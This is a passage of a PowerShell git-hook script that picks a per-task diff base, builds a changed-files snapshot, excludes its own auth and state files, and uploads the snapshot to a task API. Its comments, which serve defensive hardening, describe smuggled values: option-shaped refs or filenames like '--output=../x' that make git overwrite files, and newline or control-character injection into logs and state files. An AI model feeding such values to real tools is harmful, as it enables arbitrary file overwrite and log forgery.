        [Console]::Error.WriteLine("stride-hook: TASK_BASE_REF $shown is not trustworthy ($reason); recomputed the snapshot base from the task branch point: $bp")
        return $bp
    } catch {
        return $Base
    }
}

# (D226/D269) Choose the base for THIS task's snapshot, or REFUSE.
#
# Mirror of stride-hook.sh's select_task_snapshot_base. Precedence: this task's
# own recorded base; then the shared TASK_BASE_REF when nothing contradicts it.
# Two refusals, both of which upload an empty snapshot rather than another
# task's diff: a shared base stamped by a different task, and an unproven base
# with no per-task record.
#
# Returns @{ Refused = [bool]; Base = [string] }.
function Resolve-TaskSnapshotBase {
    param([string]$TaskId, [switch]$Quiet)

    # A base ref is a REVISION, not a pathspec, so `--` cannot protect it: a
    # value like `--output=../x` is read by git as an option and its handler
    # opens that file for writing during option parsing. `git diff --name-only
    # <base> HEAD` then truncates a file above the project root AND writes the
    # repo's changed-file NAMES into it — an arbitrary-file overwrite whose
    # content is chosen by what exists in the tree.
    #
    # The value reaches here from TASK_BASE_REF / TASK_BASE_REF_<id>, which are
    # loaded from .stride-env-cache with no key allow-list and no validation, so
    # a repository that ships that file supplies it. This function is the single
    # producer for both the build half and the upload half's read, so rejecting
    # the shape HERE is what keeps the two from drifting and covers any future
    # call site. Mirrors the leading-dash rule in Test-SafeRepoPath.
    # (W2101) The digits-only gate, the sanitize and the reserved-suffix refusal
    # that used to be copied inline here now live in Get-TaskRecordKey — the
    # single choke point D269 asked for. Get-TaskBaseRefFor performs the same
    # four steps in the same order and then the same env read and .Trim("'"), so
    # every input maps to the same $own, including a null id and 'TRUSTED' (both
    # refused before the read). Deliberately an ENV read, not Read-TaskRecord:
    # bash's task_base_ref_for is an env read too, and switching would make this
    # side stricter than the executor it shares a cache with.
    $own = Get-TaskBaseRefFor -TaskId $TaskId
    if ($own -and $own.StartsWith('-')) {
        if (-not $Quiet) {
            [Console]::Error.WriteLine("stride-hook: refusing an option-shaped per-task base ref for task $(ConvertTo-PrintableForLog -Value $TaskId) (" + (ConvertTo-PrintableForLog -Value $own) + "); ignoring it.")
        }
        $own = ''
    }
    if ($own) { return @{ Refused = $false; Base = $own } }

    $shared = [System.Environment]::GetEnvironmentVariable('TASK_BASE_REF', 'Process')
    if ($shared) { $shared = $shared.Trim("'") }
    if ($shared -and $shared.StartsWith('-')) {
        if (-not $Quiet) {
            [Console]::Error.WriteLine("stride-hook: refusing an option-shaped TASK_BASE_REF (" + (ConvertTo-PrintableForLog -Value $shared) + "); ignoring it.")
        }
        $shared = ''
    }
    $shownShared = ConvertTo-PrintableForLog -Value $shared
    if (-not $shownShared) { $shownShared = '<empty>' }

    $owner = [System.Environment]::GetEnvironmentVariable('TASK_BASE_REF_OWNER', 'Process')
    if ($owner) { $owner = $owner.Trim("'") }
    if ($TaskId -and $owner -and $owner -ne $TaskId) {
        if (-not $Quiet) {
            [Console]::Error.WriteLine("stride-hook: REFUSING the changed_files diff for task $(ConvertTo-PrintableForLog -Value $TaskId) " + [char]0x2014 + " cached TASK_BASE_REF $shownShared was written by task $(ConvertTo-PrintableForLog -Value $owner), so the captured diff would belong to another task. Uploading an empty snapshot instead.")
        }
        return @{ Refused = $true; Base = '' }
    }

    $unproven = [System.Environment]::GetEnvironmentVariable('TASK_BASE_REF_UNPROVEN', 'Process')
    if ($unproven) { $unproven = $unproven.Trim("'") }
    if ($TaskId -and $unproven -eq '1') {
        if (-not $Quiet) {
            [Console]::Error.WriteLine("stride-hook: REFUSING the changed_files diff for task $(ConvertTo-PrintableForLog -Value $TaskId) " + [char]0x2014 + " cached TASK_BASE_REF $shownShared was written by a claim that could not prove which task it belonged to, and no base is recorded for this task. Uploading an empty snapshot instead.")
        }
        return @{ Refused = $true; Base = '' }
    }

    return @{ Refused = $false; Base = $shared }
}

# (D290) The hard-name exclusions shared by the two UPLOAD-side consumers, so
# the filter in Invoke-ChangedFilesUpload and the fail-closed re-check in its
# catch cannot drift apart on which names must never reach the listener.
# Deliberately NOT the whole story: Build-ChangedFilesSnapshot's $selfNames
# below restates the same five names for the capture side — the PRIMARY control,
# which keeps them out of the snapshot as it is BUILT — because that function is
# AST-extracted against a fixed dependency list by test 31d and the bash suite's
# 7ff. The comment there says the same thing from the other side. An edit adding
# an artifact must touch BOTH lists. Names only — no secret value appears here.
function Get-ChangedFilesHardExcludedNames {
    return @(
        '.stride-diff-upload-state',
        '.stride-changed-files.json',
        '.stride-dirty-baseline',
        '.stride.md',
        '.stride_auth.md'
    )
}

# (D290) Does RAW snapshot text name a hard-excluded artifact in a `path`
# position? Invoke-ChangedFilesUpload's catch uses this to decide whether the
# PUT must be refused when the structured filter threw part-way and there is no
# parsed entry list left to inspect.
#
# Tests the JSON-decoded spelling as well as the literal one. The structured
# filter compares paths ConvertFrom-Json has ALREADY unescaped, so a snapshot
# spelling the name with JSON escapes — "\u002estride_auth.md" decodes to
# '.stride_auth.md' — would slip an exact-name regex run over raw text while
# still being the excluded path. Unescaping is best-effort: a malformed escape
# throws, and the literal form is still tested.
function Test-ChangedFilesTextNamesHardExcluded {
    param([string]$Text)
    if (-not $Text) { return $false }
    $candidates = New-Object System.Collections.Generic.List[string]
    $candidates.Add($Text)
    try { $candidates.Add([System.Text.RegularExpressions.Regex]::Unescape($Text)) } catch { }
    foreach ($candidate in $candidates) {
        foreach ($hardName in (Get-ChangedFilesHardExcludedNames)) {
            if ($candidate -match ('"path"\s*:\s*"' + [regex]::Escape($hardName) + '"')) { return $true }
        }
        # (W1609) The root .stride/ state directory, matched as a prefix,
        # mirroring the prefix arm of the structured filter.
        if ($candidate -match '"path"\s*:\s*"\.stride/') { return $true }
    }
    return $false
}

# Build the per-file diff snapshot. Mirror of stride-hook.sh's
# capture_changed_files. Returns a JSON array STRING; never throws, never
# returns $null, and degrades to the literal '[]' rather than to nothing —
# the server distinguishes [] (a real empty change set) from a missing value.
function Build-ChangedFilesSnapshot {
    param([string]$Base, [string]$OwnRanges)
    $maxLines = 500
    $truncMarker = '[diff truncated at 500 lines]'
    # The em dash MUST be built from its code point. This file has no BOM, and
    # Windows PowerShell 5.1 decodes a BOM-less .ps1 as the ANSI codepage, so a
    # literal em dash in a string would ship as mojibake on the very host this
    # targets — invisible to pwsh 7 tests and invisible to the static gate.
    $binPlaceholder = '[binary file ' + [char]0x2014 + ' no diff captured]'
    try {
        if (-not (Get-Command git -ErrorAction SilentlyContinue)) { return '[]' }

        $useBase = $Base
        if ($useBase) {
            & git -C $ProjectDir rev-parse --verify --quiet $useBase 2>$null | Out-Null
            if ($LASTEXITCODE -ne 0) { $useBase = '' }
        }
        if (-not $useBase) {
            & git -C $ProjectDir rev-parse --verify --quiet 'HEAD~1' 2>$null | Out-Null
            if ($LASTEXITCODE -ne 0) { return '[]' }
            $useBase = 'HEAD~1'
        }

        # Tracked change set.
        if ($OwnRanges) {
            $rangeText = Expand-OwnRanges -Ranges $OwnRanges -Path '' -GitArgs @('diff', '--name-only', '-z')
            $headText = Get-GitDiffBody -GitArgs @('diff', '--name-only', '-z', 'HEAD')
            $tracked = @(Split-NulList $rangeText) + @(Split-NulList $headText)
        } else {
            $tracked = Split-NulList (Get-GitDiffBody -GitArgs @('diff', '--name-only', '-z', $useBase))
        }

        # -z here too, matching the tracked path above. Without it git QUOTES any
        # non-ASCII or unusual path, so it arrives as a backslash-escaped literal
        # and is then dropped by Test-SafeRepoPath — a file silently missing from
        # the snapshot, which is the exact failure mode this task exists to end.
        # ls-files has no --output, so it cannot go through Invoke-GitCapture;
        # but -z leaves no newlines for PowerShell to split on, so the list
        # arrives whole and is split on NUL here instead.
        # (D286) Write-DirtyBaseline at the top of this file now uses this same
        # -z form. It did not when this note was written, and the mismatch was
        # the whole of that defect: a baseline keyed on the quoted spelling could
        # never match a snapshot keyed on the raw one.
        # This is the one git read that cannot use Invoke-GitCapture's byte-exact
        # --output path (ls-files has no --output), so its bytes are decoded
        # through [Console]::OutputEncoding. On Windows PowerShell 5.1 — the
        # shipping host — that defaults to the console OEM code page, which
        # would decode a non-ASCII untracked path as mojibake: it would pass
        # Test-SafeRepoPath and then produce an empty --no-index diff. That is
        # the same silent-loss class the -z change closed, relocated one layer
        # down. Pin the encoding to UTF-8 for the duration and restore it, so
        # the decode matches what git actually wrote.
        $prevOutEnc = [Console]::OutputEncoding
        $untrackedRaw = ''
        try {
            try { [Console]::OutputEncoding = New-Object System.Text.UTF8Encoding($false) } catch { }
            $untrackedRaw = (& git -C $ProjectDir ls-files -z --others --exclude-standard 2>$null | Out-String)
            if ($LASTEXITCODE -ne 0) { $untrackedRaw = '' }
        } finally {
            try { [Console]::OutputEncoding = $prevOutEnc } catch { }
        }
        # TrimEnd the newline Out-String appends. Without this the final NUL is
        # followed by a bare "`r`n", which Split-NulList emits as a phantom
        # entry; it then fails Test-SafeRepoPath's control-character rule and
        # fires the drop notice on EVERY capture that has any untracked file —
        # making a real drop indistinguishable from noise, which is exactly what
        # naming the path was meant to fix.
        $untracked = @(Split-NulList ($untrackedRaw.TrimEnd("`r", "`n")))

        # Self-exclusion: the hook's own root artifacts, and the whole root
        # .stride/ directory. Root-anchored only — sub/.stride-changed-files.json
        # is a user file and must survive.
        # (D290) These five names are deliberately restated here rather than
        # read from Get-ChangedFilesHardExcludedNames: 31d and the bash suite's
        # 7ff extract this function by AST against a FIXED dependency list, so a
        # call to a sixth function makes the extracted harness throw and yields
        # a vacuous '[]'. Unifying the two lists is worth doing, but it means
        # updating both extraction lists and belongs in its own change. Keep
        # this list and the shared one in step by hand until then.
        $selfNames = @('.stride-diff-upload-state', '.stride-changed-files.json',
                       '.stride-dirty-baseline', '.stride.md', '.stride_auth.md')
        $seen = @{}
        $paths = New-Object System.Collections.Generic.List[string]
        $untrackedSet = @{}
        foreach ($grp in @(@($tracked), @($untracked))) {
            foreach ($p in $grp) {
                if (-not $p) { continue }
                if ($selfNames -contains $p) { continue }
                if ($p -match '^\.stride/') { continue }
                if (-not (Test-SafeRepoPath $p)) {
                    # NAME the path. A dropped entry is the same class of event
                    # as a missing snapshot — silent either way — and an
                    # unnamed notice leaves no way to tell which file went, or
                    # even how many. Exit stays 0 and stdout still reports
                    # success, so this line is the only signal there is.
                    #
                    # ESCAPE it first. One of the rejection rules is "contains a
                    # control character", so printing the path raw would detect a
                    # hostile filename and then echo its ESC/CR/LF straight into
                    # the terminal, the hook log and the agent's captured output
                    # — able to rewrite the display or forge extra log lines.
                    $safeName = ($p.ToCharArray() | ForEach-Object {
                        if ([int]$_ -lt 32 -or [int]$_ -eq 127) { '\x{0:X2}' -f [int]$_ } else { $_ }
                    }) -join ''
                    [Console]::Error.WriteLine("stride-hook: dropped an unsafe snapshot path from the capture: $safeName")
                    continue
                }
                if ($seen.ContainsKey($p)) { continue }
                $seen[$p] = $true
                $paths.Add($p)
            }
        }
        foreach ($p in $untracked) { if ($p) { $untrackedSet[$p] = $true } }
        if ($paths.Count -eq 0) { return '[]' }

        # Binary set, and the D142 committed range used by the baseline filter.
        if ($OwnRanges) {
            $numstat = Expand-OwnRanges -Ranges $OwnRanges -Path '' -GitArgs @('diff', '--numstat', '-z')
        } else {
            $numstat = (Invoke-GitCapture -GitArgs @('diff', '--numstat', '-z', $useBase)).Text
        }
        $binSet = Get-NumstatBinarySet $numstat

        $dirtyBaseline = Read-DirtyBaseline
        $committedRange = Split-NulList (Get-GitDiffBody -GitArgs @('diff', '--name-only', '-z', $useBase, 'HEAD'))

        $entries = New-Object System.Collections.Generic.List[object]
        foreach ($p in $paths) {
            # (W1457/D142) Claim-time dirty-baseline filter: a path already dirty
            # at claim whose content is unchanged since is a pre-existing edit,
            # not task work. A path the task's commits contain is task work by
            # definition and is never dropped.
            if ($dirtyBaseline -and $dirtyBaseline.ContainsKey($p) -and -not ($committedRange -contains $p)) {
                $blHash = $dirtyBaseline[$p]
                if ($blHash -ne 'unhashable') {
                    $full = Join-Path $ProjectDir $p
                    $curHash = 'absent'
                    if (Test-Path -LiteralPath $full -PathType Leaf) {
                        $curHash = (& git -C $ProjectDir hash-object -- $p 2>$null | Out-String).Trim()
                        if ($LASTEXITCODE -ne 0 -or -not $curHash) { $curHash = '' }
                    }
                    if ($curHash -and $curHash -eq $blHash) { continue }
                }
            }

            $isBinary = $false
            $diffText = ''
            if ($untrackedSet.ContainsKey($p)) {
                # Exit 1 is the NORMAL result here ("files differ"); treating it
                # as failure would empty every new-file patch.
                # `--` is load-bearing, not tidiness. Without it a path that
                # begins with a dash is parsed by git as an OPTION, and git's
                # --output handler opens its target with xfopen(arg,"w") during
                # option parsing — so a directory named `--output=..` yields the
                # repo-relative path `--output=../victim` and TRUNCATES that
                # file, one level above the project root, before git reaches its
                # usage error. Filenames come from `git ls-files --others`,
                # i.e. from whatever is on disk, so the name is attacker-chosen
                # on any tree the hook runs over.
                $diffText = Get-GitDiffBody -GitArgs @('diff', '--no-index', '--no-color', '--', '/dev/null', $p) -AllowExit1
                foreach ($ln in $diffText.Split("`n")) {
                    if ($ln -match '^Binary files .* differ$') { $isBinary = $true; break }
                }
            } else {
                if ($binSet.ContainsKey($p)) { $isBinary = $true }
                if (-not $isBinary) {
                    if ($OwnRanges) {
                        $rangePart = Expand-OwnRanges -Ranges $OwnRanges -Path $p -GitArgs @('diff')
                        $headPart = Get-GitDiffBody -GitArgs @('diff', 'HEAD', '--', $p)
                        $joined = @($rangePart, $headPart) | Where-Object { $_ }
                        $diffText = ($joined -join "`n")
                    } else {
                        $diffText = Get-GitDiffBody -GitArgs @('diff', $useBase, '--', $p)
                    }
                }
            }

            if ($isBinary) {
                # Placeholder is set AFTER detection and BEFORE truncation, so it
                # is never line-counted and never cut.
                $diffText = $binPlaceholder
            } else {
                # Line count is newline-count + 1, LF-based on both hosts (a CR is
                # not a terminator). Trigger is STRICTLY greater than 500, so a
                # diff of exactly 500 lines is not truncated. The cut keeps the
                # first 499 lines and appends the marker as the final line, for
                # exactly 500 total.
                $lineCount = 0
                if ($diffText) { $lineCount = ([regex]::Matches($diffText, "`n")).Count + 1 }
                if ($lineCount -gt $maxLines) {
                    $parts = $diffText.Split("`n")
                    $diffText = (($parts[0..($maxLines - 2)]) -join "`n") + "`n" + $truncMarker
                }
            }

            $entries.Add(([pscustomobject][ordered]@{ path = $p; diff = $diffText }))
        }

        if ($entries.Count -eq 0) { return '[]' }
        # NOT ConvertTo-Json -AsArray: that parameter was added in PowerShell 6.2
        # and does not exist on Windows PowerShell 5.1, the shipping host. Each
        # entry is serialized on its own and the array is wrapped by hand, which
        # behaves identically on both hosts for 0, 1 and many entries.
        $parts = New-Object System.Collections.Generic.List[string]
        foreach ($e in $entries) { $parts.Add(($e | ConvertTo-Json -Depth 3 -Compress)) }
        return '[' + ($parts -join ',') + ']'
    } catch {
        return '[]'
    }
}

# Persist the snapshot.
#
# NOT Set-Content -Encoding UTF8: on Windows PowerShell 5.1 that writes a UTF-8
# BOM, and Invoke-ChangedFilesUpload base64s the file's raw bytes verbatim, so
# the BOM would ride onto the wire and fail the server's JSON decode on every
# native-Windows upload. This file has never been written from ps1 before, so
# the exposure is new; test 21bb pins it.
function Write-ChangedFilesSnapshot {
    param([string]$Json)
    try {
        [System.IO.File]::WriteAllText(
            (Join-Path $ProjectDir '.stride-changed-files.json'),
            $Json + "`n",
            (New-Object System.Text.UTF8Encoding($false)))
    } catch { }
}

# (D277) Recover an HTTP status from a thrown web exception, on BOTH hosts.
#
# -SkipHttpErrorCheck used to keep non-2xx responses on the success path, but it
# is PowerShell 7.0+. stride-hook.sh execs powershell.exe — Windows PowerShell
# 5.1 — so on the shipping host that parameter did not bind, the call threw a
# ParameterBindingException, and the surrounding catch attributed it to a
# transport failure and recorded '000'. Every upload silently failed there, and
# the code looked right in every pwsh 7 test.
#
# Without the parameter both hosts THROW on a non-2xx, and both expose the
# status the same way: 5.1 raises System.Net.WebException whose .Response is an
# HttpWebResponse; 7 raises Microsoft.PowerShell.Commands.HttpResponseException
# whose .Response is an HttpResponseMessage. Both carry .StatusCode, so one
# expression covers both and no $PSVersionTable branch is needed. Measured on 7:
# a 409 arrives as HttpResponseException and recovers as 409.
#
# THE TRANSPORT CASE REACHES '000' BY A DIFFERENT ROUTE ON EACH HOST, and the
# inner catch is load-bearing rather than defensive padding — an earlier version
# of this comment claimed a refused connection simply yields a null .Response on
# both, which is wrong and would invite someone to delete the catch:
#
#   * 5.1 raises WebException, which HAS a .Response property, null when the
#     request never got an answer. The `$null -eq $r` branch is that host's.
#   * 7 raises System.Net.Http.HttpRequestException, which has NO .Response
#     property AT ALL. This script runs under Set-StrictMode -Version Latest, so
#     reading it raises PropertyNotFoundException — measured, not assumed — and
#     the catch is what turns that into '000'. Delete the catch and a refused
#     connection becomes an unhandled throw on the shipping path.
#
# Either way the answer is the discriminator the bash twin gets from
# `|| printf '000'`: an HTTP error yields its status, a transport failure
# yields '000'.
#
# Only .StatusCode is read. The body is never touched, logged or persisted — it
# can echo request content, which on this path is a base64 diff. On 7 the body
# is sitting one property away, in the ErrorRecord's .ErrorDetails.Message; this
# function never receives a path to it, and must not grow one.
function Get-WebExceptionStatus {
    param($ErrorRecord)
    try {
        $r = $ErrorRecord.Exception.Response
        if ($null -eq $r) { return '000' }
        return "$([int]$r.StatusCode)"
    } catch {
        # See above: on 7 this is the REFUSED-CONNECTION path, not an edge case.
        return '000'
    }
}

# PUT the on-disk snapshot to /api/tasks/<id>/changed_files as the
# transport-encoded envelope {"changed_files":{"encoding":"base64",
# "data":"<b64>"}} so an edge request filter does not misread a unified code
# diff as an attack and drop the upload (D61). The raw file bytes are
# encoded directly so the wire body carries no recognizable source text.
# Returns the HTTP status code as a string ('000' on transport failure),
# warns on stderr for non-2xx, and never throws. Mirror of stride-hook.sh's
# upload_changed_files_snapshot (W1094) — shared by Invoke-FinalizeAfterDoing
# and the before_review self-heal. (D290) The mirror is partial by design, and
# saying so here stops the next reader inferring cover that does not exist: the
# transport, the '000' fallback and the non-2xx warning match the bash twin
# line for line, but the defensive filter block below has NO bash counterpart.
# stride-hook.sh uploads the on-disk snapshot verbatim and relies wholly on its
# capture-side exclusion (stride-hook.sh: the `.stride_auth.md` case arm in the
# candidate loop), so it has no recovering catch that could fail open — the
# D290 shape is ps1-only.
function Invoke-ChangedFilesUpload {
    param([string]$TaskId, [string]$ApiBase, [string]$Token)
    $snapshotPath = Join-Path $ProjectDir '.stride-changed-files.json'
    $httpCode = '000'
    # (D290) Set by the filter's catch when the raw snapshot cannot be proven
    # free of a hard-excluded artifact. Leaving $httpCode at '000' routes the
    # refusal through the existing non-2xx warning below rather than inventing
    # a second reporting path.
    $refuseUpload = $false
    try {
        $bytes = [System.IO.File]::ReadAllBytes($snapshotPath)
        # D67: defensively strip the hook's OWN root artifacts from the snapshot
        # before upload. The bash capture already excludes them, but this ps1
        # may PUT a snapshot produced by an older/unfiltered capture or one that
        # was committed into the repo. Match only the exact repo-root paths — a
        # same-named file in a subdirectory has a path prefix and is kept. Only
        # re-encode when an artifact was actually dropped, so an already-clean
        # snapshot uploads byte-for-byte as before; an unparseable snapshot
        # falls through to the raw bytes unchanged.
        try {
            $entries = @([System.Text.Encoding]::UTF8.GetString($bytes) | ConvertFrom-Json)
            # (W1457) Hard name exclusions (.stride.md, .stride_auth.md — the
            # auth file must NEVER be uploaded — and the baseline artifact),
            # plus the claim-time dirty-baseline exclusion: entries whose path
            # was already dirty at claim AND whose file is hash-identical now
            # are pre-existing unrelated edits, not task work. Hash mismatch,
            # deletion, or unhashable -> keep (include when in doubt).
            $dirtyBaseline = Read-DirtyBaseline
            # (D142) Paths that differ between TASK_BASE_REF and HEAD are
            # COMMITTED task work — the task's auto-commit contains them, so
            # the baseline filter below must never drop them (D137 silently
            # lost 4 tracked edits and an untracked migration whose content
            # matched their claim-time hashes after the auto-commit).
            # (D226) Prefer the base recorded by THIS task's own claim. The
            # shared TASK_BASE_REF is the nested task's after a nested claim,
            # and feeding a foreign range to the override below misfires in
            # BOTH directions — real task work that was dirty at claim gets
            # dropped (the D137 loss D142 exists to prevent), and foreign
            # paths get retained. This script builds no snapshot, but it does
            # read the base, so the read needs the same per-task selection the
            # bash twin applies.
            # (W2100) Routed through the shared resolver so the read half and
            # the build half cannot drift apart on which base belongs to this
            # task. -Quiet because the build already printed any refusal; a
            # refused base simply yields no committed-range override, which
            # errs toward KEEPING entries — the safe direction.
            $committedRange = @()
            $sel = Resolve-TaskSnapshotBase -TaskId $TaskId -Quiet
            $cfBase = ''
            if (-not $sel.Refused) { $cfBase = $sel.Base }
            # (W2100) Second layer, matching what the build half already does
            # before every use of its base: prove the value resolves to a real
            # revision before handing it to git. A base ref cannot be protected
            # by `--` because it is a revision, not a pathspec, so an
            # option-shaped value would otherwise be parsed as an option here —
            # and `--output=` writes to its target during option parsing.
            # Resolve-TaskSnapshotBase already rejects the shape; this makes the
            # sink safe on its own terms rather than relying on its producer.
            if ($cfBase) {
                & git -C $ProjectDir rev-parse --verify --quiet $cfBase 2>$null | Out-Null
                if ($LASTEXITCODE -ne 0) { $cfBase = '' }
            }
            if ($cfBase) {
                try {
                    $committedRange = @(& git -C $ProjectDir diff --name-only $cfBase HEAD 2>$null)
                    if ($LASTEXITCODE -ne 0) { $committedRange = @() }
                } catch {
                    $committedRange = @()
                }
            }
            $hardExcluded = Get-ChangedFilesHardExcludedNames
            $filtered = @($entries | Where-Object {
                # (D290) The same list the catch re-checks against. The property
                # access stays exactly where it was: under StrictMode an entry
                # carrying no `path` still throws right here, and the catch now
                # answers that throw by refusing rather than by widening.
                if ($hardExcluded -contains $_.path) { return $false }
                # (W1609) Hard-exclude the whole root .stride/ state directory
                # (orchestrator marker, the .last-api-response.json capture) —
                # mirrors stride-hook.sh's `$0 !~ /^\.stride\//`.
                if ($_.path -match '^\.stride/') { return $false }
                if ($dirtyBaseline -and $dirtyBaseline.ContainsKey($_.path)) {
                    # (D142) Committed-range override: a path the task's
                    # commits contain is task work by definition — never
                    # baseline-excluded.
                    if ($committedRange -contains $_.path) { return $true }
                    $blHash = $dirtyBaseline[$_.path]
                    if ($blHash -eq 'unhashable') { return $true }
                    $full = Join-Path $ProjectDir $_.path
                    if (Test-Path -LiteralPath $full -PathType Leaf) {
                        $curHash = (& git -C $ProjectDir hash-object -- $_.path 2>$null | Out-String).Trim()
                        if ($LASTEXITCODE -ne 0 -or -not $curHash) { return $true }
                    } else {
                        $curHash = 'absent'
                    }
                    return ($curHash -ne $blHash)
                }
                return $true
            })
            if ($filtered.Count -ne $entries.Count) {
                # (W2100) Serialize each entry and wrap the array BY HAND.
                # ConvertTo-Json -AsArray was added in PowerShell 6.2 and does
                # not exist on Windows PowerShell 5.1, the shipping host — there
                # it threw a ParameterBindingException that the catch below
                # swallowed as "not parseable", falling back to uploading the
                # RAW bytes. That is a fail-OPEN: exactly when the filter had
                # something to drop, the unfiltered snapshot went up instead,
                # including .stride_auth.md, which the comment above says must
                # never be uploaded. Hand-wrapping behaves identically on both
                # hosts for 0, 1 and many entries.
                #
                # 7e2 pins the FILTER, not this 5.1 incompatibility: on pwsh 7 —
                # the only host the suite runs on — the hand-wrapped and
                # -AsArray forms are byte-identical, so 7e2 would pass either
                # way, and the static gate checks cmdlet NAMES, never parameters.
                # The 5.1 binding failure is therefore unpinned here by
                # construction. D277 supplied the parameter-aware check this
                # comment used to forward-reference: test group 30 walks the AST
                # of every shipped ps1 and fails on a 7-only parameter by name,
                # -AsArray included, so a reintroduction here is caught on any
                # host. Say that rather than letting the test name imply cover
                # the test itself does not give.
                if ($filtered.Count -eq 0) {
                    $filteredJson = '[]'
                } else {
                    $filteredParts = New-Object System.Collections.Generic.List[string]
                    foreach ($fe in $filtered) { $filteredParts.Add(($fe | ConvertTo-Json -Depth 10 -Compress)) }
                    $filteredJson = '[' + ($filteredParts -join ',') + ']'
                }
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($filteredJson)
            }
        } catch {
            # Snapshot not parseable as the expected array — keep the raw bytes.
            #
            # (D290) But prove that is safe first. This catch spans the WHOLE
            # filter, so it also swallows a throw raised INSIDE it — under
            # Set-StrictMode -Version Latest an entry carrying no `path`
            # property throws at the comparison above — and "recovering" with
            # the raw bytes then uploads precisely what the filter existed to
            # strip. That is a fail-OPEN, and the same shape W2100 closed for
            # its one named cause (ConvertTo-Json -AsArray on 5.1) while leaving
            # the shape itself in place. The capture half of this file,
            # Build-ChangedFilesSnapshot, already fails CLOSED with '[]', so the
            # two halves disagreed about which direction is safe; this makes
            # them agree.
            #
            # Re-run only the CHEAP exact-name check, against the undecoded
            # text, and REFUSE the PUT when a hard-excluded artifact appears in
            # a `path` position. The refusal is reported by the existing non-2xx
            # warning path below, not by a new one. This is a deliberate
            # behaviour change and a narrow one: an unparseable snapshot that
            # names none of those artifacts still uploads raw, exactly as
            # before, which is the case the raw-bytes path is genuinely for.
            $rawText = $null
            try { $rawText = [System.Text.Encoding]::UTF8.GetString($bytes) } catch { $rawText = $null }
            if ($null -eq $rawText) {
                # A decode that fails leaves nothing to prove the snapshot clean
                # WITH, so it refuses. Defaulting to '' here would match no name
                # and upload the raw bytes — an inner catch quietly converting a
                # fail-closed outcome into the fail-open one this change exists
                # to invert. Unreachable in practice (this UTF8 encoder
                # substitutes rather than throwing, and $bytes is non-null by
                # the time we are here), which is exactly why it must not be
                # written the unsafe way and left to be inherited later.
                $refuseUpload = $true
            } elseif (Test-ChangedFilesTextNamesHardExcluded -Text $rawText) {
                $refuseUpload = $true
            }
            if ($refuseUpload) {
                # Name the artifact CLASS, never the entry or its contents — a
                # refusal message must not become the disclosure it prevented.
                [Console]::Error.WriteLine(
                    "stride-hook: changed_files upload REFUSED for task $TaskId - the snapshot filter failed and the raw snapshot names a hard-excluded artifact")
            }
        }
        if (-not $refuseUpload) {
            $b64 = [System.Convert]::ToBase64String($bytes)
            $body = @{ changed_files = @{ encoding = 'base64'; data = $b64 } } |
                ConvertTo-Json -Depth 5 -Compress
            # (D277) No -SkipHttpErrorCheck: it is 7.0+ and did not bind on the
            # shipping 5.1 host, where the ParameterBindingException was then
            # misread as a transport failure. A non-2xx now throws on both hosts
            # and the status is recovered from the exception.
            $resp = Invoke-WebRequest `
                -Uri "$ApiBase/api/tasks/$TaskId/changed_files" `
                -Method Put `
                -Body $body `
                -ContentType 'application/json' `
                -Headers @{ Authorization = "Bearer $Token" } `
                -UseBasicParsing -TimeoutSec 10
            $httpCode = "$([int]$resp.StatusCode)"
        }
    } catch {
        # An HTTP error carries a response and yields its real code; a genuine
        # transport failure (refused, DNS, timeout) has none and yields '000',
        # matching the bash twin's `|| printf '000'`.
        $httpCode = Get-WebExceptionStatus -ErrorRecord $_
    }
    # Surface a failed upload instead of dropping it silently. The diff is
    # non-fatal to completion, so we warn rather than abort.
    if ($httpCode -notmatch '^2') {
        [Console]::Error.WriteLine(
            "stride-hook: changed_files upload failed (HTTP $httpCode) for task $TaskId")
    }
    return $httpCode
}

# Record the outcome of a changed_files PUT attempt (W1094) so the
# before_review self-heal can verify it on a fresh timeout budget. Task id
# and HTTP code ONLY — never the URL or bearer token (the file lives
# untracked in the project root alongside the other .stride artifacts).
function Write-DiffUploadState {
    param([string]$TaskId, [string]$HttpCode, [string]$Base, [string]$Narrowed)
    try {
        # (W2103/D273) base= and narrowed= complete the state the bash twin
        # writes. The narrowing REPLAY prefers the per-task TASK_NARROWED_
        # record over this line - the state file holds one task at a time and is
        # truncated on every write, so an interleaved completion erases it
        # exactly when it is needed - but writing it closes the recorded
        # divergence and gives the resolver its documented second source for the
        # case where a claim rebuilt the cache between capture and retry.
        # REFUSE a value that cannot survive the file's one-line-per-field
        # shape, exactly as Set-TaskRecord refuses one for the cache. This file
        # is newline-delimited and its reader is FIRST-MATCH-WINS, so a base
        # carrying an embedded LF writes an extra physical line - and an
        # injected `narrowed=` would sit AHEAD of the genuine one and win,
        # steering the self-heal's replayed verdict. The base is only gated on
        # a leading dash upstream, and this file already documents that a
        # repository shipping a .stride-env-cache supplies that value, so it is
        # not trusted to be SHA-shaped here.
        #
        # Refusing the LINE rather than sanitising the value: a truncated or
        # rewritten base is a wrong answer presented as a right one, where an
        # absent line means "not recorded" and the reader already handles it.
        $lines = "task_id=$TaskId`nhttp_code=$HttpCode"
        if ($Base -and $Base -notmatch "[\r\n\0]") { $lines = $lines + "`nbase=$Base" }
        if ($Narrowed -and $Narrowed -notmatch "[\r\n\0]") { $lines = $lines + "`nnarrowed=$Narrowed" }
        # NOT Set-Content -Encoding UTF8, on the same grounds as
        # Write-ChangedFilesSnapshot above: on Windows PowerShell 5.1 - THE
        # SHIPPING HOST - that writes a UTF-8 BOM and terminates lines with CRLF.
        # BOTH break the bash twin, which reads this file with `grep '^task_id='`
        # and friends: a BOM makes the identity line unmatchable, so bash
        # discards the whole file including the base= and narrowed= this task
        # persists, and a CR-suffixed value turns bash's `case yes)` into a
        # miss. This function's own comments claim the record survives for a
        # LATER BASH RETRY on a shared checkout; with Set-Content that claim was
        # false on the only host where it matters.
        #
        # 25k2 ASSERTS THE BYTES, and it is a live assertion, not a gesture:
        # spelling the encoder UTF8Encoding($true) or the separators `r`n turns
        # it red on pwsh 7 as readily as on 5.1. What it cannot discriminate on
        # macOS is the ONE mutation of reverting to Set-Content, which is
        # BOM-free and LF here and neither on 5.1 - and it catches even that on
        # any Windows host. An earlier version of this comment called the whole
        # assertion inert, which talked a working guard down into a dead one.
        [System.IO.File]::WriteAllText(
            (Join-Path $ProjectDir '.stride-diff-upload-state'),
            $lines + "`n",
            (New-Object System.Text.UTF8Encoding($false)))
    } catch {
        # Best-effort: a failed state write must never block the hook.
    }
}

# (D127) Resolve the authoritative task id for the CURRENT completion from the
# /complete or /mark_reviewed URL in the command, independent of the env cache.
# Mirror of stride-hook.sh's task_id_from_command. Those URLs always carry
